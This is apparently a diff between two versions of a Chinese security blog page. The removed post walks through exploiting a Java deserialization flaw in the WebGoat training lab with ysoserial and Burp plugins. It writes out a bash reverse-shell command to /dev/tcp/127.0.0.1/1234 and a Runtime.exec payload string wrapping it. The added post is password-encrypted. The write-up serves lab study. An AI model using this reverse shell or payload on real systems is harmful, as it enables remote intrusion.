@@ -6,34 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://k1ng0fic3.github.io">
-  <title>ysoserial学习与实践（三） | 冰皇&#39;s blog</title>
+  <title>一文克服你对CVE的恐惧 | 冰皇&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="ysoserial实践">
+  <meta name="description" content="站住！口令？">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ysoserial学习与实践（三）">
-<meta property="og:url" content="https://k1ng0fic3.github.io/2021/08/06/ysoserial%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%B8%89%EF%BC%89/index.html">
+<meta property="og:title" content="一文克服你对CVE的恐惧">
+<meta property="og:url" content="https://k1ng0fic3.github.io/2022/08/05/%E4%B8%80%E6%96%87%E5%85%8B%E6%9C%8D%E4%BD%A0%E5%AF%B9CVE%E7%9A%84%E6%81%90%E6%83%A7/index.html">
 <meta property="og:site_name" content="冰皇&#39;s blog">
-<meta property="og:description" content="ysoserial实践">
+<meta property="og:description" content="站住！口令？">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/yso14.jpg">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/yso15.jpg">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/yso16.jpg">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/yso17.jpg">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/yso18.jpg">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/yso19.jpg">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/yso20.jpg">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/yso21.jpg">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/yso22.jpg">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/yso23.jpg">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/yso24.jpg">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/yso25.jpg">
-<meta property="og:image" content="https://k1ng0fic3.github.io/images/yso26.jpg">
-<meta property="article:published_time" content="2021-08-06T04:47:44.000Z">
-<meta property="article:modified_time" content="2022-05-14T13:26:18.521Z">
+<meta property="article:published_time" content="2022-08-05T02:47:44.000Z">
+<meta property="article:modified_time" content="2022-08-05T15:03:01.169Z">
 <meta property="article:author" content="冰皇">
-<meta property="article:tag" content="Web，宝可梦，取证">
+<meta property="article:tag" content="随笔">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://k1ng0fic3.github.io/images/yso14.jpg">
   
     <link rel="alternative" href="/atom.xml" title="冰皇&#39;s blog" type="application/atom+xml">
   
@@ -179,110 +165,38 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-ysoserial学习与实践（三）" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-一文克服你对CVE的恐惧" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      ysoserial学习与实践（三）
+      一文克服你对CVE的恐惧
     </h1>
   
 
         
-        <a href="/2021/08/06/ysoserial%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%B8%89%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2021-08-06T04:47:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-06</time>
+        <a href="/2022/08/05/%E4%B8%80%E6%96%87%E5%85%8B%E6%9C%8D%E4%BD%A0%E5%AF%B9CVE%E7%9A%84%E6%81%90%E6%83%A7/" class="archive-article-date">
+  	<time datetime="2022-08-05T02:47:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-08-05</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>ysoserial实践</p>
-<a id="more"></a>
-
-<p>上篇分析完了对于ysoserial中Commons Collections 1调用链的payload原理。由于本人水平有限，似乎写的有些啰嗦，经常说着说着又把之前的逻辑捋一遍。</p>
-<p>但是，逐步跟进分析+关键步骤POC+疑惑问题回答，应该已经分析到位了。</p>
-<p>对于其他的调用链的分析会在闲暇时间不定期完成，本篇重点关注ysoserial实战方面。</p>
-<h2 id="任务设置"><a href="#任务设置" class="headerlink" title="任务设置"></a>任务设置</h2><p>之前在刷WebGoat靶场时，要解决一道Java反序列化的题目，当时只是简单完成了任务（页面sleep5s），看到有同好说可以利用ysoserial配合burp插件使用打出反弹shell，尝试复盘此过程，以丰富ysoserial实战经验。</p>
-<h3 id="两个Burp插件"><a href="#两个Burp插件" class="headerlink" title="两个Burp插件"></a>两个Burp插件</h3><p>Java Deserialization Scanner和Java Serial Killer</p>
-<p><img src="https://k1ng0fic3.github.io/images/yso14.jpg" alt="avatar"></p>
-<h4 id="Java-Deserialization-Scanner"><a href="#Java-Deserialization-Scanner" class="headerlink" title="Java Deserialization Scanner"></a>Java Deserialization Scanner</h4><p>Java Deserialization Scanner这个插件包含了众多Java框架的反序列化漏洞，例如Spring、Hibernate等，在扫描的过程中会识别当前服务器使用的框架类型，然后对框架进行反序列化漏洞利用测试，这个测试要执行的动作可以指定为sleep、CPU、以及dns。</p>
-<p>扫描+基于ysoserial生成exploit。</p>
-<h4 id="Java-Serial-Killer"><a href="#Java-Serial-Killer" class="headerlink" title="Java Serial Killer"></a>Java Serial Killer</h4><p>插件的作者在安全客的一篇文章里做了详细<a href="https://www.anquanke.com/post/id/83571" target="_blank" rel="noopener">介绍</a>。简单来说就是避免了从ysoserial（命令行）到burp界面的来回切换，并且添加了很多自动化的button，非常方便。</p>
-<h3 id="扫描框架"><a href="#扫描框架" class="headerlink" title="扫描框架"></a>扫描框架</h3><p>因为之前已经对其源码分析过了，所以这里不再啰嗦白盒内的原理，开Java Deserialization Scanner直接扫。</p>
-<p><img src="https://k1ng0fic3.github.io/images/yso15.jpg" alt="avatar"></p>
-<p><img src="https://k1ng0fic3.github.io/images/yso16.jpg" alt="avatar"></p>
-<p>稳稳地扫出了Hibernate 5框架的反序列化漏洞，下面右键send to exp tab。</p>
-<p><img src="https://k1ng0fic3.github.io/images/yso17.jpg" alt="avatar"></p>
-<p>在箭头位置手写payload，其对应的命令即java -jar ysoserial xxx。</p>
-<h3 id="ysoserial-payload"><a href="#ysoserial-payload" class="headerlink" title="ysoserial payload"></a>ysoserial payload</h3><p>继续下一步之前，需要将ysoserial添加入Java Deserialization Scanner配置。</p>
-<p><img src="https://k1ng0fic3.github.io/images/yso18.jpg" alt="avatar"></p>
-<p>默认里面带着一个老版本的，可能会因为一些功能受限不太好用，建议修改路径指向自己做好的，如：C:\Users\xxx\Desktop\ysoserial.jar</p>
-<p>下面看一下支持的command：</p>
-<p><img src="https://k1ng0fic3.github.io/images/yso19.jpg" alt="avatar"></p>
-<p>然而这里尝试了几个命令都没有成功执行。</p>
-<p><img src="https://k1ng0fic3.github.io/images/yso20.jpg" alt="avatar"></p>
-<p>出现此报错信息的原因是payload在插件的源码中是硬编码的。需要将源码重新编译一下。</p>
-<h3 id="工具调整"><a href="#工具调整" class="headerlink" title="工具调整"></a>工具调整</h3><blockquote>
-<p>mvn clean package -DskipTests -Dhibernate5</p>
-</blockquote>
-<p><img src="https://k1ng0fic3.github.io/images/yso21.jpg" alt="avatar"></p>
-<p>这条命令的依据在配置文件pom.xml中：</p>
-<p><img src="https://k1ng0fic3.github.io/images/yso22.jpg" alt="avatar"></p>
-<p>一如既往skipTests跳过测试，然后指定hibernate5属性，指定后才会把org.hibernate和javax.el两个库加进去。</p>
-<p>那这俩库到底有什么用，自行阅读ysoserial的代码，不再详细展开，修改插件的配置，指向做好的新ysoserial.jar。</p>
-<p>再次运行payload就可以了（注意单引号闭合参数，双引号都不对），成功！</p>
-<p><img src="https://k1ng0fic3.github.io/images/yso23.jpg" alt="avatar"></p>
-<h3 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h3><p>从WebGoat容器中确定bash可用：</p>
-<p><img src="https://k1ng0fic3.github.io/images/yso24.jpg" alt="avatar"></p>
-<p>常用的bash反弹shell如：</p>
-<blockquote>
-<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1</p>
-</blockquote>
-<p>分段理解一下这个语句：</p>
-<blockquote>
-<p>1、bash -i &gt;&amp; xxx</p>
-</blockquote>
-<p>把交互式的bash重定向到fd文件xxx；</p>
-<blockquote>
-<p>2、/dev/tcp/127.0.0.1/1234</p>
-</blockquote>
-<p>创建socket的方法，Ubuntu、Centos均支持；</p>
-<blockquote>
-<p>3、0&gt;&amp;1</p>
-</blockquote>
-<p>把标准输入fd0和标准输出fd1合并在一起。</p>
-<p>结合以上，此语句的含义为把交互式的bash输入输出重定向到tcp连接127.0.0.1:1234这个socket里，然后在主机（假如是127.0.0.1）监听此1234端口，就可以对此反弹shell进行操作。</p>
-<p>马克思原理搞懂了，现在落实一下中国国情：</p>
-<blockquote>
-<p>1、WebGoat中默认使用sh，想执行bash需要指定/bin/bash -c xxxx</p>
-</blockquote>
-<blockquote>
-<p>2、Java的Runtime exec方法执行带重定向的command时需要注意用String[]即数组的方式把整条命令分割开，否则会执行失败</p>
-</blockquote>
-<p>收录调用方式：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String command)</span> <span class="keyword">throws</span> IOExecption</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String command,String [] envp)</span> <span class="keyword">throws</span> IOExecption</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String command,String [] envp,File dir)</span> <span class="keyword">throws</span> IOExecption</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String[] cmdarray)</span> <span class="keyword">throws</span> IOExecption</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String[] cmdarray,String [] envp)</span> <span class="keyword">throws</span> IOExecption</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String[] cmdarray,String [] envp,File dir)</span> <span class="keyword">throws</span> IOExecption</span></span><br></pre></td></tr></table></figure>
-
-<p>倒数三行均可以用，但是发现：</p>
-<blockquote>
-<p>3、ysoserial中内置的payload生成方法与这里不符，需要进行修改</p>
-</blockquote>
-<p><img src="https://k1ng0fic3.github.io/images/yso25.jpg" alt="avatar"></p>
-<p>这里就是简单实现了下第一行语句的方法，command即为传入的payload，而需要的代码则如：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">String [] cmd = &#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1"</span>&#125;;</span><br><span class="line">Process p = r.exec(cmd);</span><br><span class="line">p.waitFor();  <span class="comment">//加waitFor是为了等待调用外部的程序执行完才返回，便于操作反弹的shell</span></span><br></pre></td></tr></table></figure>
-
-<p>合并成一个字符串：</p>
-<blockquote>
-<p>“java.lang.Runtime.getRuntime().exec(new String []{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1&quot;}).waitFor();”</p>
-</blockquote>
-<p>那么进行修改，原封不动，丢进String cmd就可以。或者可以再写个拼接，这样payload里就可以修改弹shell的地址。</p>
-<p><img src="https://k1ng0fic3.github.io/images/yso26.jpg" alt="avatar"></p>
-<p>之后用上节的方法重新打包加配置就好了，payload写Hibernate1 ‘x.x.x.x’。</p>
-<p>类比真实的环境应该是布到docker里打，但是VMware的虚拟机网段无法与本机通信，尝试修改未果。</p>
-<p>能在真实场景下用到的话，回来补弹shell的图。</p>
-
+        <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="答错了哟" data-whm="好像不太对，不过算了">
+  <script id="hbeData" type="hbeData" data-hmacdigest="429e043adcc0e0e9183791fd7b43927c70cec2a7cc9b77f80ab00f8a46b9e44e">ab140b8b9257be54d9d6c2ab66634361fddabbd9f5986c7ab13981acc6301b2ef7bcada03199b169c2dc1fba59fd2e075fe3b761252b1a5b0e8fbc4f02bac654374e5aca81352c15a3c932bfa3459b6cf2562f53b119e0df627a9b4898b486a53cbd92606f79d343f453d0efbce9b2ea6bbc8634faa343969ebe9a0f282c66ee053d821f76542cf6e1dc4abdbb6e32d4c623e990529177a417d0639cd7332e635d6419dc7587a35d26754baf0b8aa69510a2691541ccc44afd427c5b7b180c0484bf58eaac199fd3d57a197ef248f0dd8fa42004187d238e0c3143f3e90923ae067a1d24e6df24369fb4d1dfca537d179829b387a3ce9864f365bdaedda02f7e0eb43f6a851848fa7be7264870885635a11b5a5cf020c0ca7deabf7b25d8a5e2d854af6c0dc01bff0f22c92053d93059608544f724cd5135bda953c3fe2fcc5e43674956ce7b8b77194972aaf6f9990c2383cfe8b9f91370468e166485b09b28c07c53641170045437d878572d7cf4a7a444d5fbbbf1ef439b2bab630e89f531ca03305cc25e67e2c02fafa7d10c29345ab097295b0be567195c87c230f24e629979b1848de5137a32ef90cfc483ff3206b0267b24ac82e73a2e0a28ddb0634a2ceec5a92129184ee9ae6e1132da86bc4ad01faaaa14e879285b0494e32c401e6a5fe5d94dd00f2042392cc28699be764b6b73b848b852e48bb711720677b5272d0544a593393625c08f85708b914e46fd6c975e585d98bfabed165ad7daad13e04386351c5eec460fab45da88bd3d180c86ce90610f684ee3c95cc804e8e5b23baffd6bbadf4b77dac254b98837a724e4db95ea1da3ba6fa57cff6c47bfd165f2cc59b45c9f6f9323c20839ca61a090fdca8eb5ce6bd6fc6c0faa5269ecbc68f5966745f5c8397bfb3295c2974ad55d7a7df7aef83c0d6ed5794f41122ecd0ea41c3dbe1505f4450221b53bc02083b31e93859319808e9f7e8115f11423261595ee7fb65e05f04a7209697aa6b6b408561d1d1f6a08fdc014ff857d68ecbe4d95b76b0bb0a1e88df8b7f528c7b50fc25d7cc97676d3798e66ee9e87446270ed5c2b53739ba98e0b7b60ff75b53110c86f0680cf08894f8b8aba7219f7dad31c60b0a5caff2de05fc21366d1c435a17560704cd69393c590c2928b5e0abaab6b4e67c724092f705d770b320ed56aa72c57e8cfa43a0d764889331c8297dcf4888d4e9c4f23b204d8f9e8e61b89b635a0feaec46f8036e539c95a185014705abb59bbd72df8dcef7a383273de43a10ce469532b1e6bf17bf4fa8ba1558af6e900016683598a05b4b9b6c592c217b3bfb3348fc5c43bf483661642e028a8f71b478ef37f08611ef04634ba1908d3968921f1946bba5bc024125dfee0772b6d9744f061d414bfb20133d27f31282afaa550da79ff3b76754c473370971263c87e41799cd52682f39222797ff588c42b147de7d773ebca63933b0ef5cb83c620df7e9f91fbd490ae95c84f36152efd10ef05b95d0e5a41516c38a4ec29ae752e9ab003743ebd768e01ecf3bc1e3fe912427ec376f24b3361ae21079634074dbaffacae76072a45c91321f1d5005bf5bec5553f2f8e802cc6ecfd16387227a2296184ff18abc0dc59c4458f87d9690fa324dd603b0156cc2652e724ee754204dd11e027931dba9c05b04244f1cef8914a9879e922102f136c530577509ed27dcdb6a6085c97f60ddc179837c059813dfe9b69feb6efdef22a6199ea0bae86e0179b93ee330ccb964e98ae1a14333ca5797b15d226926b55598c19a1960ac7343ba880b6fb8a12dc6466129b6adc6082919f708a242e0cad4133ae2805111e504149862877cc0d3afe3d83967c43ccb3eed720d96c15fd00c1ba6d7cc1ba3eb5893171eb37de2708351e08a0b5b3711c786c744009610d4bed4720eb8bec338d9ba046ed5c88d6442a480b13bf11a7af4a1c8ff4e9db4428d4424d38905ee154ca53694b996eb33acc59f8994cbe2efefdf642fae8b85ec3b8ff2367828c1ec43772f31e5feb0d5fa6603564b885c68cdc2761ca3fb54811863e9284544ebe4cde075d5a2ff8a0e8ef90f6f92d80f6eeda2730877c75607d5554f087d4ea7ca22f594be86da5087146faec454213eacbe09b10f74a7e947f3ccd4d1ddfbf9934b6530b68635d5ed74ed54676fd9ac291a66edb8d80ab5f47e7ca1e5d0dbe12ac633afa322a5c30936b689c88e6aa0059e07f1c29434efa8840e972645ae63f0fa11b4d024f3ee763df969f8c4761488e9f66c185836cadce08ab1e060c8bdbf4b080d6ab7ddfab8ce17702a7e2d19a4f07c320f9207055d6e5247d9e93a9d401bdd04896ce9fc5e6e027aa7ed8b94fcf232123da41e49ba329504a11f5bac97348f44f66e91d04d646a89d9370ac2c9b5cd45ba80817a9e45b25fa3c686adeae00081839ee95c1a179f0532eb2c087d6d6ec7a</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">叫什么名字？</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
       
 
       
@@ -321,6 +235,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -371,7 +296,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://k1ng0fic3.github.io/2021/08/06/ysoserial%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%B8%89%EF%BC%89/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://k1ng0fic3.github.io/2022/08/05/%E4%B8%80%E6%96%87%E5%85%8B%E6%9C%8D%E4%BD%A0%E5%AF%B9CVE%E7%9A%84%E6%81%90%E6%83%A7/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -385,18 +310,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2022/08/05/%E4%B8%80%E6%96%87%E5%85%8B%E6%9C%8D%E4%BD%A0%E5%AF%B9CVE%E7%9A%84%E6%81%90%E6%83%A7/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          一文克服你对CVE的恐惧
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/08/04/ysoserial%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">ysoserial学习与实践（二）</div>
+    <a href="/2021/08/06/ysoserial%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%B8%89%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ysoserial学习与实践（三）</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -423,7 +339,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#任务设置"><span class="toc-number">1.</span> <span class="toc-text">任务设置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#两个Burp插件"><span class="toc-number">1.1.</span> <span class="toc-text">两个Burp插件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Java-Deserialization-Scanner"><span class="toc-number">1.1.1.</span> <span class="toc-text">Java Deserialization Scanner</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Java-Serial-Killer"><span class="toc-number">1.1.2.</span> <span class="toc-text">Java Serial Killer</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#扫描框架"><span class="toc-number">1.2.</span> <span class="toc-text">扫描框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ysoserial-payload"><span class="toc-number">1.3.</span> <span class="toc-text">ysoserial payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#工具调整"><span class="toc-number">1.4.</span> <span class="toc-text">工具调整</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#最终payload"><span class="toc-number">1.5.</span> <span class="toc-text">最终payload</span></a></li></ol></li></ol>
+                    目录，不存在的…
                     </div>
                 </span>
             </div>
